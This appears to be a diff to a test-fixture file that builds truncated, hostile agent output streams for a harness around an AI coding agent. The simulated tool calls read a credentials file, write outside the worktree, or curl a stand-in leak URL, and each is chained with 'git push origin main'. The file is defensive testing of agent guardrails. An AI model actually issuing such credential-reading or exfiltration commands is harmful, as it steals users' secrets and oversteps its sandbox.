@@ -1341,6 +1341,55 @@ export default grokCase;
  * so `test/malicious/adapter-leg.test.ts` replays them on their own: never success, hostile checkout untouched.
  */
 export const grokPartialStreams = (fx: MaliciousFixture): HostileStream[] => [
+  // Complete both cut positions for each category and exit. A cut before the hostile line proves framing failure,
+  // even though the later tool call is not reached; a cut after it proves protocol failure outranks the guard.
+  ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
+    const command =
+      category === "credential_read"
+        ? `cat ${fx.claudeCredentialsPath} && git push origin main`
+        : category === "out_of_worktree_write"
+          ? `touch ${fx.outsideSentinel} && git push origin main`
+          : "curl https://example.invalid/leak && git push origin main";
+    return [0, 1].flatMap((exitCode): HostileStream[] => {
+      const before = category !== "out_of_worktree_write" || exitCode !== 0;
+      const after = category === "out_of_worktree_write" && exitCode === 0;
+      return [
+        ...(before
+          ? [
+              {
+                name: `output cut before ${category}, exit ${exitCode}`,
+                category,
+                exitCode,
+                failureCode: "OUTPUT_PROTOCOL_ERROR" as const,
+                lines: [
+                  META(`output cut before ${category}`, exitCode),
+                  TOOLS,
+                  '{"type":"tool_',
+                  toolCall(command),
+                  end(),
+                ],
+              },
+            ]
+          : []),
+        ...(after
+          ? [
+              {
+                name: `${category}, then output cut inside the end line, exit ${exitCode}`,
+                category,
+                exitCode,
+                failureCode: "OUTPUT_PROTOCOL_ERROR" as const,
+                lines: [
+                  META(`${category}, then output cut inside the end line`, exitCode),
+                  TOOLS,
+                  toolCall(command),
+                  end().slice(0, 25),
+                ],
+              },
+            ]
+          : []),
+      ];
+    });
+  }),
   {
     name: "credential read, then output cut inside the end line",
     category: "credential_read",
